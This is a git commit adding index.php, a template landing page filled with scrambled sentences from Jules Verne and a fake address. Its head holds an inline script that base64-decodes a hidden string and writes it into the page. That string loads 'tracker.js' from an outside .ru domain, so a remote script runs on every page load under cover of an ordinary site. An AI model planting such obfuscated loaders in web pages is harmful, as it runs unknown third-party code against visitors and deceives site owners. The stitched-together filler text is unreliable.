4a33f359e767f89bf6172636084011aa013f7d7f
enlijzqq <76059211+enlijzqq@users.noreply.github.com>
2020-12-15 17:48:58 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Well, captain, said he, it is still time, in the interest of the whal</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl81cTNuZGJpbWp3cWciPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Well, captain, said he, it is still time, in the interest of the whal</h1>
+	</section>
+
+
+	<section class="our-work">
+		<h3 class="title">I can picture it perfectly, said Conseil. But, sir,</h3>
+		<p>I waited still some time, then went into the large saloon. The clock marked half-past two. In ten minutes it would be high tide, and if Captain Nemo had not made a rash promise, the Nautilus would be immediately detached. If not, many months would pass ere she could leave her bed of coral. Perhaps. As well, by your honor's leave, as a hermit crab in the shell of a whelk, said Conseil. One day, when I was suggesting this theory to Captain Nemo, he replied coldly:</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work">
+		<h3 class="title">On the 15th of May we were at the extreme </h3>
+		<p>Look well, said Ned, there, on the starboard beam, about the height of the lantern! Do you not see a mass which seems to move? My brave Ned, that country is not clearly indicated on the map of the world; but I admit that the nationality of the two strangers is hard to determine. Neither English, French, nor German, that is quite certain. However, I am inclined to think that the commander and his companion were born in low latitudes. There is southern blood in them. But I cannot decide by their appearance whether they are Spaniards, Turks, Arabians, or Indians. As to their language, it is quite incomprehensible. A little more, said Conseil, and they would be perfect lamps! After that, we cannot expect nature to have previously furnished them with wicks! Then, M. Aronnax, I propose a curious excursion.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="title">Captain Nemo entered his room, and I saw him no more for some t</h3>	
+		<p>This man's name! his history written by himself! His mystery would then be revealed some day. Ned! Ned! What are you saying? You, a man-eater? I should not feel safe with you, especially as I share your cabin. I might perhaps wake one day to find myself half-devoured. But not the air you breathe? I mounted at once, accompanied by Ned Land and Conseil. At a distance of about twelve miles, Cape St. Vincent was dimly to be seen, forming the southwestern point of the Spanish peninsula. A strong southerly gale was blowing. The sea was swollen and billowy; it made the Nautilus rock violently. It was almost impossible to keep one's footing on the platform, which the heavy rolls of the sea beat over every instant. So we descended after inhaling some mouthfuls of fresh air.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>370 Jess Knoll, Suite 518, 45837, Vandervortland, Hawaii, United States</p>
+	</footer>
+
+</body>
+
+</html>
